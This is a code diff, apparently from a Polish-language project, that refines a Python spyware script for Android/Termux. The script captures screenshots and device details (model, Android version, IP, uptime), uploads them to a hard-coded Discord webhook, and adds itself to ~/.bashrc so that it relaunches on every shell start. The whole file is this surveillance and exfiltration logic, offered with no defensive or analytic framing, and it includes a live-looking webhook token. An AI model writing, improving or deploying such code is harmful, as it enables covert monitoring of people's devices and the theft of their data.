@@ -3,14 +3,13 @@ import subprocess
 import os
 import time
 import requests
-import base64
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"
 
 def send_screenshot():
     """Zrób screena i wyślij do Discord"""
     try:
-        # Zrzut ekranu przez ADB lub screencap
+        # Zrzut ekranu
         cmd = "screencap -p /sdcard/screen.png"
         subprocess.run(cmd, shell=True, timeout=10)
         
@@ -18,31 +17,60 @@ def send_screenshot():
             with open("/sdcard/screen.png", "rb") as f:
                 files = {"file": ("screen.png", f, "image/png")}
                 requests.post(WEBHOOK_URL, files=files)
+                print("[+] Screenshot wysłany")
     except Exception as e:
-        print(f"Screenshot error: {e}")
+        print(f"[-] Screenshot error: {e}")
 
 def send_info():
     """Zbierz info o urządzeniu"""
-    info = f"""
+    try:
+        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
+        android_ver = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
+        uptime = subprocess.check_output(['uptime']).decode().strip()
+        
+        # IP
+        try:
+            ip = subprocess.check_output(['hostname', '-I']).decode().strip()
+        except:
+            ip = "brak IP"
+        
+        info = f"""
 **Device Info**
-- Model: {subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()}
-- Android: {subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()}
-- IP: {subprocess.check_output(['hostname', '-I']).decode().strip() or subprocess.check_output(['ifconfig']).decode()}
-- Uptime: {subprocess.check_output(['uptime']).decode().strip()}
+- Model: {model}
+- Android: {android_ver}
+- IP: {ip}
+- Uptime: {uptime}
 """
-    requests.post(WEBHOOK_URL, content=info)
+        requests.post(WEBHOOK_URL, content=info)
+        print("[+] Info wysłane")
+    except Exception as e:
+        print(f"[-] Info error: {e}")
 
 def persistence():
     """Dodaj do autostartu Termux"""
     script_path = os.path.abspath(__file__)
     bashrc = os.path.expanduser("~/.bashrc")
+    
+    # Utwórz .bashrc jeśli nie istnieje
+    if not os.path.exists(bashrc):
+        open(bashrc, 'w').close()
+        print("[+] Utworzono .bashrc")
+    
     entry = f"(sleep 30 && python3 {script_path}) &\n"
     
-    if entry not in open(bashrc).read():
-        with open(bashrc, "a") as f:
+    with open(bashrc, 'r') as f:
+        content = f.read()
+    
+    if entry not in content:
+        with open(bashrc, 'a') as f:
             f.write(entry)
+        print("[+] Dodano do autostartu .bashrc")
+    else:
+        print("[*] Już jest w autostarcie")
 
 if __name__ == "__main__":
+    print("[*] Start skryptu zbierającego...")
+    
     # Persistence
     persistence()
     
